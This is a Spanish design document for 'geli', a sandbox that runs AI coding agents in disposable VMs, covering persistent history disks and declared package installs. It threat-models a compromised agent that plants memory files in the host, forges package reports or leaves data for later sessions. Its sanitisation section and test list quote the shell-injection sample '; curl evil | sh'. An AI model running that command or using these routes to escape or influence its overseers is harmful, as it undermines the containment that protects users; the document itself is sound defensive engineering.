# Estado que sobrevive a la sesión: historial y herramientas

Una VM de `geli` es desechable, y eso tiene dos costes para quien la usa: el agente no encuentra el
historial del proyecto, y las herramientas que necesitó la sesión anterior ya no están.

Son dos problemas distintos, con ciclos de vida distintos, y se resuelven por separado:

- **El historial** vive en un **qcow2 persistente por `(workspace, agente)`** que el host no lee y
  que nada invalida.
- **Las herramientas** se **declaran en `.geli.json`** y se reinstalan en cada arranque desde
  caché. La raíz de la VM sigue siendo desechable.

---

## 1. El problema

`geli` corre agentes en VMs desechables montando el código por 9p en `/workspace/<proyecto>`. Por
diseño no copia `~/.claude` ni `~/.gemini` enteros: ahí vive el historial de todos los proyectos y
de todos los clientes. La consecuencia es doble:

- Al entrar, el agente no encuentra nada previo — no hay `/resume`, no hay hilo de contexto.
- Al salir, la VM se lleva consigo todo lo que se conversó dentro, y también cualquier `apk add` o
  `npm i -g` que hiciera falta para trabajar.

---

## 2. Dónde guarda cada agente su historial

### Claude Code

`~/.claude/projects/<slug>/`, donde el slug es la ruta absoluta con `/` → `-`:

```
/home/pkarc/github/geli  →  ~/.claude/projects/-home-pkarc-github-geli/
                              ├── 4bc0736e-….jsonl      342 KB
                              ├── 83bc45b2-….jsonl       11 MB   (una sola sesión)
                              └── memory/
```

**Medido: 11 MB en una sola sesión de este proyecto** — el historial no es pequeño y crece por
sesión, no por proyecto.

### Antigravity CLI

`~/.gemini/antigravity-cli/`, medido en este host:

| | tamaño | qué es |
| :--- | ---: | :--- |
| `conversation_summaries.db` | 152 KB | índice SQLite **global**: 88 conversaciones de todos los proyectos |
| `conversations/<cid>.db` | 334 MB | el log detallado, una DB por conversación |
| `brain/<cid>/` | 1.3 GB | artefactos, `transcript.jsonl`, logs de tareas |

Dos hechos importan: **el índice es global** — un fichero, todos los proyectos — y **parte del
historial de `agy` vive en SQLite**, no en ficheros sueltos.

---

## 3. Por qué el historial no se sincroniza con el host

**El historial del sandbox nace y vive dentro del sandbox. El host no lo lee y el sandbox no
escribe en el host.**

Es una tercera categoría, distinta de las dos que `geli` ya tiene: `credentials` copia verbatim del
home del usuario, `seed_files` sintetiza de la nada y **no lee el host a propósito**. El historial
no hace ninguna de las dos: se acumula.

La alternativa obvia — filtrar del host lo del proyecto abierto, traducir rutas y devolver al final
lo generado dentro — está descartada en el **apéndice A**, con los cinco problemas que arrastraba.
El resumen es que **la dirección de vuelta es el problema**: escribir en
`~/.claude/projects/<slug>/memory/` desde el sandbox planta contexto que el Claude Code *de
confianza* del host carga en cada sesión futura, fuera de la VM, indefinidamente. Es un canal de
inyección persistente, inherente a sincronizar.

### Lo que esta decisión hace desaparecer

Dentro del disco la ruta del proyecto es **siempre** `/workspace/geli`, en todas las sesiones. Por
tanto: no hay traducción de rutas, no hay que filtrar `workspace_uris` (el índice de `agy` dentro
del disco nunca tuvo otra cosa), no entra `rusqlite`, no hay manifiesto ni diff por `mtime` ni
política de conflicto contra un `agy` del host abierto en otra ventana, y no hay carrera con el
borrado del share dir. Deja de importar incluso si `claude` valida el `cwd` al reanudar: el `cwd`
grabado y el real son el mismo.

### Por qué un qcow2 y no un 9p como las cachés de npm y pip

El patrón 9p también evitaría la inyección — los ficheros estarían en `~/.cache/geli-sandbox/`, no
en `~/.claude/`, así que el agente del host no los leería jamás.

Lo que lo descarta es `agy`: **SQLite sobre 9p tiene un bloqueo poco fiable**. Un qcow2 lleva un
sistema de ficheros real dentro, con locking POSIX y `fsync` de verdad. Si la mitad del historial
que queremos conservar es una base de datos, eso decide.

De regalo, el disco es opaco: no acaba en el backup del host, ni en un `grep -r ~`, ni sincronizado
a una nube por accidente.

---

## 4. El disco de historial

Un fichero por workspace y agente, **fuera de la cadena de respaldo**:

```
~/qemu-sandbox/geli-base.qcow2                      la imagen base
~/qemu-sandbox/geli-layer-claude.qcow2              la capa del agente
/tmp/sandbox-session-<pid>.qcow2                    la sesión        ← se borra al salir
~/.local/share/geli/history-<ws>-<agente>.qcow2     el historial     ← persiste
```

No es un overlay sobre nada: es un segundo disco independiente, enganchado como un `-drive` más en
`qemu_args`, donde hoy se añaden los `-fsdev` de los 9p. La raíz de la VM se sigue tirando igual
que ahora.

**Que esté fuera de la cadena es el punto entero.** Un overlay sobre `geli-layer-claude.qcow2`
dejaría de ser válido en cuanto esa capa se reconstruyera — cambia la receta, upstream se mueve,
alguien corre `--build-image` — que es la regla que ya aplica `discard_layers`. Es decir:
**actualizar el agente te borraría el historial**, un efecto que nadie espera y que se descubre
cuando ya pasó. Las conversaciones tienen que vivir en algo cuyo ciclo de vida no dependa de la
imagen. Rebasear el overlay a la capa nueva con `qemu-img rebase` es técnicamente posible y
prácticamente una fábrica de corrupción: el contenido asume los ficheros de la capa vieja.

### La clave es `(workspace, agente)`

Ni sólo por agente, que mezclaría proyectos y reintroduciría justo la fuga que motivó todo esto. Ni
sólo por workspace, que mezclaría formatos de agentes distintos y pondría el estado de uno al
alcance del otro — lo contrario del aislamiento de credenciales por agente que ya existe.

El nombre sale del workspace (ya saneado a minúsculas, alfanuméricos y `-`, porque es nombre de
fichero y hostname) y de `agent.command`, igual que las capas derivan el suyo dentro de
`ensure_layer`. Un solo sitio del que sale el nombre, para que no haya dos que puedan discrepar.

### Qué se persiste, y qué no

**Sólo las rutas de historial. Nunca el home entero.**

Esto es lo más fácil de hacer mal. Si montas todo `~/.claude` en el disco persistente, persistes
también `.credentials.json` y el `.claude.json` sembrado — y ahí se rompe la historia de
credenciales, que es efímera a propósito y se reconstruye cada sesión desde el host. Una credencial
rotada en el host seguiría viva dentro del disco.

| agente | se persiste |
| :--- | :--- |
| `claude` | `~/.claude/projects/-workspace-<carpeta>/` |
| `agy` | `~/.gemini/antigravity-cli/{conversation_summaries.db,conversations/,brain/}` |

Vive en un `match`, con la misma justificación que `seed_files`: saber qué subdirectorio de un
agente es historial y cuál es credencial exige conocer ese agente, y un campo TOML suficientemente
expresivo para decirlo sería un lenguaje de programación con peor ergonomía. Todo lo demás del
agente sigue siendo datos en `agents/*.toml`.

El disco se monta en un punto neutro (`/var/lib/geli-history`) y esas rutas se enlazan dentro, en
`mounts.sh`, como root, **antes de la marca de preparado** — si no, el agente puede arrancar antes
de tener su historial, el mismo razonamiento por el que el cierre de red va donde va.

### Concurrencia

Dos sesiones del mismo workspace y agente corrompen el disco si ambas lo abren en escritura. Ya
existe el cerrojo `O_EXCL` con pid de `try_build_lock`, con `lock_holder_alive` para que una sesión
muerta no bloquee a las siguientes.

Pero **bloquear aquí es mala UX**: esperar a que se construya una capa tiene sentido, esperar para
abrir una sesión no. La primera abre el disco en escritura; las demás corren sobre un overlay
desechable encima del disco persistente — funcionan, ven el historial, no persisten, y el bloque de
estado lo dice. Es el vocabulario de overlays que el proyecto ya habla.

---

## 5. Las herramientas: declarar, no acumular

Un agente que necesita `ripgrep` o `jq` lo instala, y la sesión siguiente no lo tiene. La respuesta
**no** es conservar el overlay de la raíz (apéndice C), sino declarar lo que el proyecto necesita:

```json
{
  "workspace": "geli",
  "history": true,
  "packages": {
    "apk": ["ripgrep", "jq"],
    "npm": ["prettier"],
    "pip": ["httpx"]
  }
}
```

`pip` está porque su caché ya existía: dejarlo fuera habría sido arbitrario, no conservador.

Se instala en cada arranque desde caché local. La raíz sigue siendo desechable, lo que el agente
ensucie se tira, y la lista sobrevive a reconstrucciones de capa y de base porque no es una imagen:
es texto en el repositorio.

Lo que no cubre, y hay que decirlo: **no captura lo que el agente instaló sin que nadie lo
declarara.** Esa sesión lo tiene; la siguiente no, hasta que alguien lo escriba en `.geli.json`. Es
el precio de que el resultado sea reproducible en vez de acumulado — y el mismo trato que `geli` ya
le da al resto de la configuración del guest.

### El orden es lo que hace que esto funcione

En `mounts.sh`, como root: **mounts → paquetes → lockdown → marca de preparado.**

Lo estrecho no es la marca, es el lockdown. En cuanto corre no hay ruta por defecto, `resolv.conf`
está vacío y el `nftables` de denegación por defecto sólo deja pasar el puerto del proxy: un
paquete pedido después de eso no se puede bajar. Y como una instalación fallida sólo avisa,
tampoco fallaría de forma ruidosa — arrancarías sin tus herramientas y el motivo sería una línea
en un log de consola que nadie lee. `packages_install_before_egress_is_cut` existe por eso.

Es la misma clase de orden cargante que CLAUDE.md ya documenta para el propio lockdown: ruta,
ruleset, sudo.

### Bajo `--restrict-net`, el bloque de estado lo dice

De lo anterior se sigue algo que no se puede dejar implícito: en una sesión restringida, estos
paquetes son **lo único** que se busca fuera de la lista de permitidos, porque se bajan antes del
cierre. La línea `net restricted · N domains allowed` daría a entender lo contrario, así que
debajo va:

```
  net    restricted · 9 domains allowed
  tools  apk ripgrep jq · npm prettier · fetched before the egress lockdown
```

La regla del proyecto es que la línea de estado no mienta ni por omisión. Si esto resulta
inaceptable, la alternativa no es callarlo: es no instalar nada bajo `--restrict-net` y decirlo.

### Las cachés, y por qué hay que apuntar a ellas

Hoy hay dos 9p de caché, `~/.cache/geli-sandbox/{npm,pip}`. Hace falta un tercero para `apk`, que
se monta en `/var/cache/apk` con `/etc/apk/cache` enlazado ahí — Alpine no trae ese enlace y sin
él apk no cachea nada.

Y un detalle que anula las tres si se pasa por alto: **las instalaciones corren como root, y la
caché de root no es la del usuario `sandbox`.** Sin `--cache` y `--cache-dir` explícitos, cada
arranque se volvería a bajar lo que ya está en el disco del host, que es justamente lo que esas
comparticiones existen para evitar.

### Declarar no puede ser trabajo manual

Pedirle a alguien que escriba la lista a mano es pedirle que recuerde, al final de una sesión, qué
instaló al principio. No lo va a hacer, y entonces §5 se queda en una buena idea sin uso.

Así que el sandbox lo cuenta. Al arrancar, **después** de instalar lo declarado, toma una foto de
lo que hay explícitamente instalado; al terminar, antes de apagar, emite la diferencia. El host la
lee y pregunta, una vez por gestor:

```
geli · this session installed apk packages not in .geli.json:
    1. ripgrep
    2. fd
[?] Keep them for next time? (a)ll / (s)elect / (N)one:
```

Tres detalles que lo hacen funcionar:

- **La foto se toma después de los paquetes declarados.** Si se tomara antes, lo ya declarado
  aparecería como hallazgo en cada arranque y la pregunta no se callaría nunca.
- **Explícito, no presente.** `/etc/apk/world` en vez de `apk info`, `--depth=0` en npm,
  `--not-required` en pip. Un solo `apk add` arrastra su cierre de dependencias, y una lista de
  cuarenta paquetes no es una pregunta: es un muro.
- **Va por la consola de arranque**, que el host ya lee para la marca de preparado. Sin dispositivo
  nuevo, que es el mismo razonamiento por el que la marca vive ahí.

### Lo que el guest dice es una propuesta, no un hecho

`/dev/ttyS1` es escribible por todos — tiene que serlo, para que la marca de preparado llegue — así
que **el agente puede escribir esas líneas él mismo**. Un informe es una petición de añadir algo a
un fichero del host que gobierna un shell de root en los arranques siguientes.

Por eso hay dos filtros y ninguno es opcional: el host **valida cada nombre** antes de enseñarlo, y
**nada se escribe sin que la persona diga que sí**. La pregunta no es cortesía; es el control.

Fuera de un terminal no se pregunta: se imprime lo que se instaló y se sigue. Preguntar hacia una
tubería o cuelga o lee la entrada de otro, y un log de CI merece ver igualmente qué añadió la
sesión.

### Qué pasa si falla

Un paquete que no instala **avisa y sigue**, no apaga la VM. El contraste es con el cierre de red,
que sí apaga: ahí el bloque de estado ya ha afirmado que el egress está restringido y seguir sería
mentir. Aquí no hay ninguna afirmación que se rompa — el agente se queda sin una herramienta y lo
verá en cuanto la use.

**El coste de arranque hay que medirlo.** Una sesión arranca hoy en ~9 s, y eso costó trabajo. `apk
add` desde caché es barato; `npm i -g` no lo es tanto. Si la lista típica mete segundos
apreciables, la respuesta es hornear una capa por workspace, no resignarse — pero eso es una
decisión posterior y con número delante.

### `.geli.json` no es un fichero de confianza

Está en el directorio del proyecto, así que **puede venir en un repositorio clonado**. Dos
consecuencias:

- **Los nombres de paquete se sanean.** Van a un shell como root, y `"; curl evil | sh"` es
  inyección trivial. El daño queda dentro de la VM y bajo la política de egress, pero dejar abierta
  una inyección a root porque está contenida es la clase de atajo que envejece mal. Alfanuméricos,
  `-`, `_`, `.`, `+`, `@` y `/` para scopes de npm; cualquier otra cosa se rechaza con un error que
  nombra el paquete.
- **Instalar paquetes porque lo dijo un fichero del repositorio es, en sí, una decisión del
  usuario.** Queda contenido en la VM, que es para lo que está, y el bloque de estado nombra lo que
  se va a instalar antes de arrancar.

Esto no es un problema nuevo que traiga `packages`, y conviene escribirlo aquí porque la respuesta
debería ser la misma para los tres campos: hoy `.geli.json` también lleva `allow`, que ensancha la
lista de egress, y `ssh`, que en `main.rs:90` entra en `forward_ssh` junto al flag — un repositorio
que traiga `{"ssh": true}` reenvía las claves SSH del usuario sin que nadie teclee `--ssh`, que es
lo contrario de lo que CLAUDE.md dice de esa bandera. **Se trata aparte de este diseño**, pero
`packages` no debe añadirse como si el fichero fuera de fiar.

---

## 6. Lo que esto cuesta

### El día uno está vacío

Lo que conversaste con `claude` fuera de geli no aparece nunca dentro. Es la única regresión real
frente a sincronizar, y es deliberada: sembrar desde el host devuelve el filtro exacto por
`workspace_uris`, `rusqlite` y la traducción de rutas — todo el coste del apéndice A — para
resolver un problema que dura una sesión.

Si más adelante se echa de menos, **se puede añadir sin tocar nada de esto**: una siembra inicial,
de ida y una sola vez, escribe en un disco que ya existe. Lo que no vuelve a entrar en discusión es
la dirección de vuelta.

### "The session leaves nothing behind" deja de ser cierto sin matices

Es una propiedad de cabecera del proyecto y ahora tiene una excepción acotada — un disco de datos,
no la raíz — así que la excepción tiene que ser explícita. **Se pregunta una vez por workspace y se
guarda en `.geli.json`**, que ya tiene el precedente exacto:

```
[?] Enable SSH forwarding permanently for workspace 'geli' in .geli.json? (y/N):
```

Un flag que hay que teclear cada vez convierte la continuidad en fricción, que es el problema que
veníamos a resolver. El bloque de estado dice en cada sesión si el historial es persistente, igual
que nombra montajes y credenciales: un disco que persiste sin que se vea es la clase de cosa que se
descubre tarde.

### La contaminación persiste dentro del linaje del sandbox

Un agente comprometido puede dejar algo en ese disco y encontrárselo la sesión siguiente del mismo
workspace y agente. Está acotado a ficheros de datos — la raíz no persiste, así que no hay binarios
ni `PATH` ni unidades de arranque que plantar — y no llega al host, ni a otro proyecto, ni a otro
agente. Se mata borrando un fichero.

Hace falta poder borrarlo y poder mirarlo: `--reset-history` y alguna forma de exportar, porque un
disco opaco que no se puede inspeccionar es un sitio donde esconder cosas.

### Borrar dentro no encoge el qcow2

La lección del `fstrim` de la receta base aplica igual: montar con `discard` y dejar sitio para
podar. Con `brain/` creciendo a 1.3 GB en el host, no es teórico.

---

## 7. Qué se prueba sin arrancar una VM

- `history_disk_name_is_keyed_by_workspace_and_agent` — dos agentes en un workspace no comparten
  fichero, ni dos workspaces en un agente.
- `history_persists_no_credentials` — gemelo de
  `recipes_do_not_claim_credentials_that_are_really_seeded`: falla si una ruta persistida pisa una
  de `credentials` o de `seed_files`.
- `history_paths_are_guest_only` — ninguna ruta persistida sale del árbol del guest ni menciona el
  home del host.
- `history_is_opt_in` — sin el ajuste en `.geli.json`, no se engancha ningún disco.
- `packages_install_before_egress_is_cut` — el orden de §5, más que las instalaciones apunten a
  las cachés y que un fallo no apague la VM.
- `package_names_reject_shell_metacharacters` — `"; curl evil | sh"` no llega al guest.
- `local_config_without_packages_still_parses` — gemelo del que ya existe para `allow`: los
  `.geli.json` que hay en disco siguen cargando.
- `no_packages_means_no_install_step` — sin nada declarado, el script es el de antes.
- `installed_packages_are_read_as_a_proposal_not_a_fact` — una línea inyectada por el agente, con
  un nombre que no es un nombre o un gestor inventado, no llega a la pregunta.
- `already_declared_packages_are_not_offered_again` — la mitad del host de la foto diferida.
- `the_baseline_is_taken_after_the_declared_installs` — y el informe, antes del `poweroff`.
- `selection_answers_are_all_or_nothing` — `1 4` sobre tres opciones se rechaza entero.
- `status_block_discloses_packages_fetched_before_the_lockdown` — y la línea va debajo de `net`.
- `session_cloud_init_parses`, extendido con una lista declarada: las instalaciones entran en el
  mismo bloque literal que los montajes, y ese bloque es donde el documento se rompió una vez.

**§5 está implementado; §4 no.** Las marcas de arriba que hablan del disco de historial siguen
siendo el plan.

---

## 8. Qué da y qué no

**Da:** continuidad entre sesiones desechables (`/resume` funciona), persistencia de lo conversado
dentro, herramientas del proyecto disponibles desde el primer segundo, y cero datos del usuario
cruzando hacia la VM por esta vía.

**No da:** continuidad con lo que hiciste fuera de geli, historial compartido entre dos workspaces
que miran el mismo repositorio, ni conservación de lo que el agente instaló sin declararlo.

---

## Apéndice A — descartado: sincronizar con el historial del host

Filtrar del host las conversaciones del proyecto abierto, traducir las rutas a `/workspace/`,
copiarlas al staging y al terminar devolver al host lo generado dentro. Funciona, y cinco cosas lo
hacen caro:

1. **El filtro es fácil de hacer mal.** `workspace_uris LIKE '%<ruta>%'` falla en dos direcciones,
   y las dos están presentes en este host: casa `geli-extra` cuando pides `geli`, y **2 de las 88
   filas tienen más de un workspace** — una con `geli` y otro proyecto arrastraría al sandbox el
   título, el `preview` y el `raw_summary` del segundo. El filtro correcto parsea el array JSON y
   compara elemento a elemento. Es el incidente de `trustedFolders.json` otra vez.
2. **La traducción de rutas es parcial por construcción.** Se reescribe el índice; no los
   `transcript.jsonl` de `brain/`, ni el `raw_summary` (un BLOB protobuf), ni los `cwd` dentro de
   cada `.jsonl` de `claude`.
3. **La vuelta es un canal de inyección hacia el host**, que es la razón de fondo. Ver §3.
4. **La escritura compite con el host.** Un `INSERT OR REPLACE` ciego contra un `agy` abierto en
   otra ventana es una actualización perdida.
5. **El sync tiene que correr antes del teardown y en todos los caminos sucios** — el `poweroff`
   del lockdown, un kill, un cloud-init roto — y ser idempotente.

Más `rusqlite` como primera dependencia pesada, y dos cosas que había que medir antes de poder
estimar el trabajo (si `claude` valida el `cwd` al reanudar; si `--continue` exige `lastSessionId`
en `~/.claude.json`, lo que chocaría con `claude_config_holds_only_what_suppresses_the_prompts`).

El disco persistente hace desaparecer los cinco, la dependencia y las dos mediciones.

## Apéndice B — descartado: montar el directorio del host por 9p

Para `claude` el problema parece disolverse solo: el slug **es un nombre de directorio**, así que
montar `~/.claude/projects/-home-pkarc-github-geli` del host en
`/home/sandbox/.claude/projects/-workspace-geli` del guest da traducción de ruta,
bidireccionalidad y persistencia sin una línea de sincronización y sin copia.

**Se descarta porque regala justo lo que hay que controlar.** Un montaje es un canal de escritura
directo y sin validar desde el sandbox al home del usuario: el guest puede corromper o borrar el
historial real y plantar ficheros en `memory/` sin que nada los mire. El problema del apéndice A.3
deja de ser resoluble y pasa a ser estructural.

Para `agy` ni siquiera es una opción: `conversation_summaries.db` es global, montarla expone las 88
conversaciones, y SQLite sobre 9p tiene un bloqueo poco fiable.

## Apéndice C — descartado: conservar el overlay de la raíz

La forma barata de que las instalaciones sobrevivan: no borrar `/tmp/sandbox-session-<pid>.qcow2`,
guardar uno por `(workspace, agente)` y reusarlo. Persiste todo — `apk add`, `npm i -g`, el
historial de propina — sin declarar nada y sin mapear rutas por agente.

Se descarta por tres razones, y la primera basta:

1. **Se invalida al reconstruir la capa.** El overlay se apoya en `geli-layer-<agente>.qcow2`; si
   esa capa se rehace, el respaldo ya no existe. Si el historial viviera ahí, actualizar el agente
   lo borraría. Por eso el historial va en un disco **fuera** de la cadena (§4) y por eso, aunque
   se quisiera el overlay, harían falta dos discos igualmente.
2. **La VM deja de ser fresca de verdad.** La contaminación pasa de ser ficheros de datos a ser la
   raíz entera: binarios, `PATH`, lo que el agente dejara en `/etc`. Sigue sin llegar al host, pero
   dentro de ese linaje un agente comprometido tiene punto de apoyo permanente.
3. **Acumula sin límite y sin registro.** Nadie sabe qué hay dentro ni por qué, y "funciona en mi
   sandbox" vuelve a ser una frase posible.

La alternativa declarativa (§5) cuesta escribir una lista y devuelve reproducibilidad: sobrevive a
reconstrucciones, se revisa en un diff y se explica sola.
